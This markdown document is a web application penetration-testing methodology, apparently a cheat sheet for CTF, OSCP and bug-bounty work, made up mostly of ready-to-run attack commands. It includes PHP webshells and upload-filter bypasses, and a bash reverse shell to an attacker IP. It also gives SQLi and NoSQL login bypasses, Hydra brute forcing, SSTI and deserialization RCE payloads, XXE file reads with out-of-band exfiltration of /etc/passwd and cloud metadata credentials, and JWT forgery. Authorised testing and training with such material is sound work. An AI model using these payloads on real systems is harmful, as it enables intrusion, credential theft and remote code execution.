---
id: "03"
title: "Web Application PT"
tags: ["web"]
---
# 03 — Web Application Penetration Testing Methodology

> **Description:** Complete web application assessment — fingerprinting to shell.
> **Best For:** Any target with a web service, web app CTF challenges, bug bounty prep.
> **Strength:** Full coverage from passive recon to active exploitation with exact tool commands, wordlists, and bypass techniques.

---

## 1. Fingerprinting & Tech Stack Identification

```bash
# whatweb — automated tech detection
whatweb http://<TARGET-IP> -a 3 -v | tee scans/whatweb.txt
whatweb https://<TARGET-IP> -a 3 -v

# curl header inspection — manual but reliable
curl -sI http://<TARGET-IP>
curl -sI https://<TARGET-IP>
curl -sv http://<TARGET-IP> 2>&1 | grep -E "< |> "

# nikto — vulnerability scanner + info disclosure
nikto -h http://<TARGET-IP> -o scans/nikto.txt -Format txt
nikto -h http://<TARGET-IP> -C all -o scans/nikto_full.txt

# wappalyzer equivalent — builtwith via CLI
# Use browser extension Wappalyzer on the target, or:
webanalyze -host http://<TARGET-IP> -crawl 2

# SSL/TLS inspection (HTTPS targets)
sslscan <TARGET-IP>:443
testssl.sh <TARGET-IP>:443
nmap --script ssl-enum-ciphers -p 443 <TARGET-IP>
```

**What to extract:**
- Web server (Apache, Nginx, IIS, LiteSpeed) + version
- Backend language (PHP, Python, Ruby, Java, ASP.NET)
- CMS (WordPress, Joomla, Drupal, etc.)
- Framework (Laravel, Django, Rails, Spring)
- JavaScript libraries + versions
- Cookie names (PHPSESSID = PHP, JSESSIONID = Java, ASP.NET_SessionId = .NET)

---

## 2. Directory & File Enumeration

### Wordlist Selection Guide

| Wordlist | Path | When to Use |
| --- | --- | --- |
| `directory-list-2.3-medium.txt` | `/usr/share/wordlists/seclists/Discovery/Web-Content/` | Default first choice — balanced speed vs coverage |
| `directory-list-2.3-big.txt` | `/usr/share/wordlists/seclists/Discovery/Web-Content/` | When medium misses things — slower but more thorough |
| `raft-large-directories.txt` | `/usr/share/wordlists/seclists/Discovery/Web-Content/` | Best for finding hidden admin panels, non-standard paths |
| `common.txt` | `/usr/share/wordlists/dirb/` | Very fast, high-value paths only — use when time is limited |
| `big.txt` | `/usr/share/wordlists/dirb/` | Good secondary pass |
| `quickhits.txt` | `/usr/share/wordlists/seclists/Discovery/Web-Content/` | Known vulnerable/sensitive paths — run this always |

### gobuster

```bash
# Standard directory scan
gobuster dir \
  -u http://<TARGET-IP> \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,old,zip,sql,conf,js \
  -o scans/gobuster_med.txt \
  -t 50 \
  --timeout 10s

# HTTPS (ignore cert errors)
gobuster dir -u https://<TARGET-IP> -k \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt -o scans/gobuster_https.txt

# Virtual host discovery
gobuster vhost \
  -u http://<DOMAIN> \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -o scans/vhosts.txt

# DNS subdomain enum
gobuster dns \
  -d <DOMAIN> \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -r <TARGET-IP>
```

### ffuf

```bash
# Directory/file fuzzing
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -u http://<TARGET-IP>/FUZZ \
  -e .php,.html,.txt,.bak \
  -o scans/ffuf_dirs.json \
  -mc 200,204,301,302,307,403

# POST parameter fuzzing
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u http://<TARGET-IP>/form.php \
  -X POST \
  -d "FUZZ=test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc 200 -fs <BASELINE-SIZE>

# Virtual host discovery with ffuf
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://<TARGET-IP> \
  -H "Host: FUZZ.<DOMAIN>" \
  -mc 200 -fs <BASELINE-SIZE>
```

### feroxbuster (recursive — best for deep crawling)

```bash
feroxbuster \
  -u http://<TARGET-IP> \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -x php,html,txt,js,json \
  -o scans/ferox.txt \
  --depth 3 \
  -t 50
```

---

## 3. Manual Exploration with Burp Suite

### Burp Setup Checklist

```
1. Launch Burp → Proxy → Options → Confirm listener on 127.0.0.1:8080
2. Browser: set proxy to 127.0.0.1:8080
3. Import Burp's CA cert into browser (http://burp → CA Certificate)
4. Enable Intercept → browse every page of the app
5. Target → Scope → Add http://<TARGET-IP>
6. Spider (Burp Pro) or manually visit all functionality
```

### What to Map During Manual Browse

- Every parameter in every form
- URL parameters (`?id=`, `?page=`, `?file=`, `?user=`)
- Cookies and their values
- API endpoints (`/api/`, `/v1/`, `/graphql`)
- Admin paths (`/admin`, `/dashboard`, `/manager`, `/console`)
- File upload functionality
- Login forms (SQLi candidates)
- Search boxes (XSS candidates)
- Any error messages (version info, paths, stack traces)

---

## 6. File Upload Exploitation

### Step 1: Understand What's Accepted

```bash
# Try uploading a normal image first — understand the flow
# Then try: image with PHP content, PHP file disguised as image
```

### Step 2: Bypass Techniques

```bash
# Extension bypass — try all variants
shell.php
shell.php5
shell.php7
shell.phtml
shell.pht
shell.phps
shell.shtml

# Double extension
shell.php.jpg
shell.jpg.php

# Null byte (older PHP)
shell.php%00.jpg

# Content-Type bypass (change MIME type in Burp)
# Original: Content-Type: application/x-php
# Change to: Content-Type: image/jpeg
# But keep file content as PHP

# Magic bytes bypass (prepend JPEG magic bytes to PHP file)
echo -e '\xFF\xD8\xFF\xE0' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# Polyglot (valid image AND valid PHP)
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
```

### Step 3: PHP Webshells

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo `$_GET[cmd]`; ?>

<!-- Usage: http://<TARGET-IP>/uploads/shell.php?cmd=id -->
<!-- Upgrade to rev shell: -->
<!-- ?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<YOUR-IP>/4444+0>%261' -->
```

### Step 4: Trigger the Shell

```bash
# After upload, navigate to the file location
# Common upload directories:
/uploads/
/files/
/media/
/assets/uploads/
/wp-content/uploads/
/images/

# Find exact path from page source or gobuster output
```

---

## 8. Authentication Bypass

### Default Credentials to Try

```bash
admin:admin
admin:password
admin:admin123
admin:1234
admin:(blank)
root:root
root:password
root:toor
administrator:administrator
test:test
guest:guest
user:user
# CMS-specific:
admin:admin        # WordPress, Joomla
admin:password     # Drupal
admin@admin.com:admin  # Drupal alternative
```

### SQLi Login Bypass

```sql
-- Username field injection
admin'--
admin'#
admin'/*
' OR 1=1--
' OR '1'='1'--
admin' OR '1'='1'--
' OR 1=1 LIMIT 1--
') OR ('1'='1
```

### Brute Force with Hydra

```bash
# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  <TARGET-IP> http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP GET form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  <TARGET-IP> http-get-form "/login:username=^USER^&password=^PASS^:Login failed"

# HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  http-get://<TARGET-IP>/protected/

# Username + password list (from found usernames)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  <TARGET-IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:Wrong"

# SSH brute force
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET-IP>

# FTP brute force
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET-IP>
```

---

## 9. CMS-Specific Attacks

### WordPress

```bash
# Enumeration
wpscan --url http://<TARGET-IP> -e vp,vt,u --plugins-detection aggressive | tee scans/wpscan.txt

# User enumeration only
wpscan --url http://<TARGET-IP> -e u

# Brute force WordPress login
wpscan --url http://<TARGET-IP> -U admin -P /usr/share/wordlists/rockyou.txt

# After getting admin credentials → RCE
# Appearance → Theme Editor → select a PHP file → inject reverse shell
# OR: Plugins → Add New → upload malicious plugin ZIP
# Plugin shell: <?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}?>
# Access: http://<TARGET-IP>/wp-content/plugins/shell/shell.php?cmd=id

# LFI / traversal in plugins/themes
# Check for vulnerable plugins via wpscan CVE database
```

### Joomla

```bash
# Enumeration
joomscan --url http://<TARGET-IP> | tee scans/joomscan.txt

# Manual checks
curl http://<TARGET-IP>/administrator/    # Admin login panel
curl http://<TARGET-IP>/README.txt        # Version disclosure
curl http://<TARGET-IP>/configuration.php # Config file

# After admin access → RCE
# Extensions → Templates → Beez3 → index.php → inject PHP reverse shell
```

### Drupal

```bash
# Version detection
droopescan scan drupal -u http://<TARGET-IP>
curl http://<TARGET-IP>/CHANGELOG.txt     # Version number

# CVE-2018-7600 (Drupalgeddon2 — unauthenticated RCE)
searchsploit drupalgeddon
python3 44449.py http://<TARGET-IP>

# After admin access
# Admin → Configuration → Modules → Enable PHP Filter
# Admin → Content → Add Basic Page → PHP code in body with filter = PHP code
```

### CMS Made Simple (CVE-2019-9053)

```bash
# SQL injection in News module — classic OSCP box vulnerability
searchsploit cms made simple 2.2.9
python3 46635.py -u http://<TARGET-IP>/cmsms --crack -w /usr/share/wordlists/rockyou.txt

# Manual exploit (GET parameter injection in m1_idlist)
# http://<TARGET-IP>/index.php?page=news&category=1,updatexml(1,concat(0x7e,(select version()),0x7e),1)
```

---

## 11. Endpoint Mapping (Python Crawler)

```python
#!/usr/bin/env python3
# Simple crawler to map all links before attacking
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://<TARGET-IP>"
visited = set()
to_visit = {TARGET}
found_endpoints = []

headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/109.0"}

def crawl(url):
    try:
        r = requests.get(url, headers=headers, timeout=5, verify=False)
        soup = BeautifulSoup(r.text, 'html.parser')
        links = []
        for tag in soup.find_all(['a', 'form', 'script', 'link']):
            href = tag.get('href') or tag.get('action') or tag.get('src')
            if href:
                full = urljoin(url, href)
                if urlparse(full).netloc == urlparse(TARGET).netloc:
                    links.append(full)
        return links
    except Exception as e:
        return []

while to_visit:
    url = to_visit.pop()
    if url in visited:
        continue
    visited.add(url)
    print(f"[+] {url}")
    found_endpoints.append(url)
    for link in crawl(url):
        if link not in visited:
            to_visit.add(link)

print("\n=== ALL ENDPOINTS ===")
for ep in sorted(found_endpoints):
    print(ep)
```

```bash
python3 crawler.py http://<TARGET-IP>
```

---

## 12. Server-Side Template Injection (SSTI)

**What it is:** When user input is concatenated into a server-side template, you can inject template syntax that the engine evaluates, often straight to RCE. It hides anywhere input is echoed back through a template: profile names, email templates, error pages. Detect it, fingerprint the engine, then drop the engine-specific gadget.

```bash
# Detection: inject a math expression into any reflected parameter (49 = SSTI)
curl -g 'http://<TARGET-IP>/?name={{7*7}}'
# Polyglot set to try: {{7*7}}  ${7*7}  <%= 7*7 %>  ${{7*7}}  #{7*7}
# Fingerprint: {{7*'7'}} returning 7777777 is Jinja2 or Twig
```

```bash
# Jinja2 (Python / Flask) -> RCE
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

```bash
# Twig (PHP) -> RCE
{{['id']|filter('system')}}
{{['id','']|sort('system')}}
```

```bash
# Freemarker (Java) -> RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

```bash
# Automate detection and exploitation across engines
python2 tplmap.py -u 'http://<TARGET-IP>/page?name=*' --os-cmd id
```

**Most common exploit path:** `{{7*7}}` reflects 49 → fingerprint with `{{7*'7'}}` → drop the engine-specific gadget for RCE. Maps to OWASP A03 Injection.

---

## 13. Insecure Deserialization

**What it is:** When an app rebuilds an object from attacker-controlled data, a crafted object can run code as it is deserialized. The classic tells: Java (a base64 blob starting `rO0AB`), PHP `unserialize()` (an `O:` object string), .NET, and Python `pickle`. Gadget-chain tools build the payload for you.

```bash
# Java: encode your reverse shell, then embed it in a gadget chain
echo -n 'bash -i >& /dev/tcp/<YOUR-IP>/<LPORT> 0>&1' | base64
# Runtime.exec needs the echo|base64|bash wrapper (it does not invoke a shell):
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,<BASE64>}|{base64,-d}|{bash,-i}' > payload.bin
curl -X POST http://<TARGET-IP>/api --data-binary @payload.bin
```

```bash
# PHP object injection: input like O:4:"User":1:{...} reaches unserialize()
php -r 'class User{public $cmd="id";} echo serialize(new User());'
# PHPGGC builds ready chains for common frameworks (Laravel, Symfony, WordPress)
phpggc Laravel/RCE1 system id
```

```bash
# Python pickle: any pickle.loads on your input is RCE
python3 -c 'import pickle,os,base64;print(base64.b64encode(pickle.dumps(type("x",(object,),{"__reduce__":lambda self:(os.system,("id",))})())).decode())'
# .NET: ysoserial.net for ViewState / BinaryFormatter sinks
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -e <B64>"
```

**Most common exploit path:** Spot the format (rO0AB / O:.. / pickle) → build the chain with ysoserial or phpggc → RCE at the sink. Maps to OWASP A08 Software and Data Integrity Failures.

---

## 14. XML External Entity (XXE)

**What it is:** When an XML parser processes external entities, you can declare one that reads a local file, reaches internal services (SSRF), or exfiltrates data out of band. Anywhere the app accepts XML (SOAP, SAML, `.docx`/`.svg` uploads, `Content-Type: application/xml`) is a candidate.

```bash
# File read: declare an external entity pointing at a local file
curl -X POST http://<TARGET-IP>/api -H 'Content-Type: application/xml' \
  --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
```

```bash
# SSRF via XXE: point the entity at an internal host or cloud metadata
# <!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
# PHP source disclosure via wrapper (base64 survives the XML parser):
# <!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

```bash
# Blind XXE out-of-band exfil: host a malicious DTD, the entity fetches then sends the file
# evil.dtd: <!ENTITY % f SYSTEM "file:///etc/passwd"><!ENTITY % o "<!ENTITY e SYSTEM 'http://<YOUR-IP>/?d=%f;'>">
python3 -m http.server 80
```

**Most common exploit path:** App parses XML → inject a SYSTEM entity for `file:///etc/passwd` → if blind, use an out-of-band DTD to exfil, or point at `169.254.169.254` for cloud creds. Maps to OWASP A03 / A05.

---

## 15. JWT Attacks

**What it is:** JSON Web Tokens carry identity, and weak implementations let you forge them. The big three: `alg:none` (strip the signature), a weak HMAC secret you can crack, and RS256-to-HS256 key confusion (sign with the public key as the HMAC secret). jwt_tool automates all of them.

```bash
# Decode and inspect, then run every well-known attack automatically
jwt_tool <JWT>
jwt_tool <JWT> -M at -t http://<TARGET-IP>/api
```

```bash
# alg:none - strip the signature (works when the server trusts the header alg)
jwt_tool <JWT> -X a

# Crack a weak HMAC secret offline, then forge any claim
hashcat -m 16500 <JWT> /usr/share/wordlists/rockyou.txt
jwt_tool <JWT> -S hs256 -p 'secret123' -I -pc name -pv admin
```

```bash
# RS256 -> HS256 key confusion: sign with the server public key as the HMAC secret
jwt_tool <JWT> -X k -pk public.pem
```

**Most common exploit path:** Decode → try alg:none → if HS256, crack the secret with `hashcat -m 16500` → forge an admin token. Maps to OWASP A07 Identification and Authentication Failures.

---

## 16. NoSQL Injection

**What it is:** MongoDB and friends do not use SQL, but input concatenated into a query is still injectable. Operator injection (`$ne`, `$gt`, `$regex`) bypasses auth and extracts data; `$where` and server-side JavaScript can reach code execution.

```bash
# Auth bypass via operator injection (JSON body)
curl -X POST http://<TARGET-IP>/login -H 'Content-Type: application/json' \
  --data '{"username":"admin","password":{"$ne":null}}'

# Same idea in a URL-encoded body
curl 'http://<TARGET-IP>/login' --data 'username=admin&password[$ne]=x'
```

```bash
# Blind extraction with $regex, one character at a time (true/false oracle)
# password[$regex]=^a  ->  password[$regex]=^ad  ->  password[$regex]=^adm ...
# nosqlmap automates detection and extraction
python nosqlmap.py -u 'http://<TARGET-IP>/login' --data 'user=*&pass=*'
```

**Most common exploit path:** `{"$ne":null}` or `password[$ne]=x` bypasses login → `$regex` extracts secrets char by char → `$where` for JS execution if allowed. Maps to OWASP A03 Injection.
